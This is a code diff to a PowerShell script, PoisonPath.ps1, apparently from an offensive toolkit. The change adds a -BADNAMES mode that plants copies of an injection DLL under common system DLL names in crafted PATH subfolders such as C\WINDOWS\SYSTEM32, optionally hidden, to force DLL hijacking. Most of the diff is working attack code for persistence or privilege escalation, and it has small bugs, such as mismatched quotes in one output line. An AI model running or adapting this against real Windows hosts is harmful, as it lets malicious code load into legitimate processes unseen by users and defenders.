@@ -51,21 +51,34 @@ Example 2: PoisonPath.ps1 -PATH C:\Tools\LEAP\bin
 
 This will append the current user's PATH variable with the path "C:\Tools\LEAP\bin\"
 
-Example 3: PoisonPath.ps1 -PATH C:\Tools\LEAP\bin -BRUTE -DLL C:\Tools\LEAP\bin\Inject.dll
+Example 3: PoisonPath.ps1 -PATH C:\Tools\LEAP\bin -BRUTE -DLL C:\Tools\LEAP\bin\LEAPInject.dll
 
 This will attempt to brute force a DLL hijack by abusing commonly requested DLL names and 
 creating a PATH variable folder containg these DLL files.  This is achieved by placing
-a copy of Inject.dll for each DLL name listed in the DLL Brute Force List into 
+a copy of LEAPInject.dll for each DLL name listed in the DLL Brute Force List into 
 the PATH variable.
 
 Users can update this list with additional DLL files as they see fit in order to expand
 capabilities of this tool kit.
 
 
-Example 4: PoisonPath.ps1 -PATH C:\Tools\LEAP\bin -BRUTE -HIDDEN -DLL C:\Tools\LEAP\BIN\Inject.dll
+Example 4: PoisonPath.ps1 -PATH C:\Tools\LEAP\bin -BRUTE -HIDDEN -DLL C:\Tools\LEAP\BIN\LEAPInject.dll
 
 As Above, however the brute forced DLL files will be assigned the HIDDEN, SYSTEM, & 
 READONLY attributes.
+
+Example 5: PoisonPath.ps1 -PATH C:\Tools\LEAP\bin -BADNAMES
+
+This will attempt to trigger a DLL Hijack by creating a PATH entry of C:\Tools\LEAP\bin\ as well as
+creating subfolders designed to take advantage of malformed folders searched via bad parsing code + DLLSearchOrder
+examples of these folders are as follows:
+
+-%PATH%\Windows\
+-%PATH%\C\Windows\
+-%PATH%\Windows\System32\
+-%PATH%\C\Windows\System32\
+-%PATH%\System32\
+
 #>
 
 Param
@@ -86,6 +99,9 @@ Param
 
     [Parameter(ValueFromPipelineByPropertyName = $true)]
     [switch]$HIDDEN,
+    
+    [Parameter(ValueFromPipelineByPropertyName = $true)]
+    [switch]$BADNAMES,
 
     [Parameter(ValueFromPipelineByPropertyName = $true)]
     [string]$DLL = "",
@@ -125,7 +141,11 @@ $DLLs = @("VERSION.DLL",
 "Bcp47Langs.dll",
 "wincorlib.DLL")
 
-
+$BADDIRs = @("C",
+"WINDOWS",
+"SYSTEM32",
+"C\WINDOWS",
+"C\WINDOWS\SYSTEM32")
 
 $PathEnv = [Environment]::GetEnvironmentVariable("Path")
 
@@ -143,7 +163,7 @@ if (!(Test-Path  $Path -PathType Container))
 
 if ($DLL.Length -eq 0)
 {
-    $DLL = $(Split-Path $MyInvocation.MyCommand.Path -Parent) + "\bin\LEAP.dll"
+    $DLL = $(Split-Path $MyInvocation.MyCommand.Path -Parent) + "\bin\LEAPInject.dll"
     
 }
 
@@ -152,6 +172,14 @@ if (!(Test-Path $DLL))
     throw "Fatal Error: The specified file: $DLL does not exist."  
 }
 
+if ($BADNAMES)
+{
+    $OrigPath = $Path
+    foreach ($BADDIR in $BADDIRs)
+    {
+        New-Item -ItemType directory -Path $($Path + $BADDIR) -Force
+    }
+}
 
 if ($BRUTE)
 {
@@ -165,7 +193,19 @@ if ($BRUTE)
             $hidefile = Get-Item $($Path + "\" + $dllfile) -Force
             $hidefile.Attributes = "Hidden", "System", "ReadOnly"
         }
-
+        if ($BADNAMES)
+        {
+            foreach ($BADDIR in $BADDIRs)
+            {
+                Write-Host "Planting $dllfile in $Path + "\" + $BADDIR"
+                Copy-Item $DLL $($Path + "\" + $BADDIR + "\" + $dllfile) -Force
+                if ($HIDDEN)
+                {
+                    $hidefile = Get-Item $($Path + "\" + $dllfile) -Force
+                    $hidefile.Attributes = "Hidden", "System", "ReadOnly"
+                }  
+            }
+        }
     }
 }
 
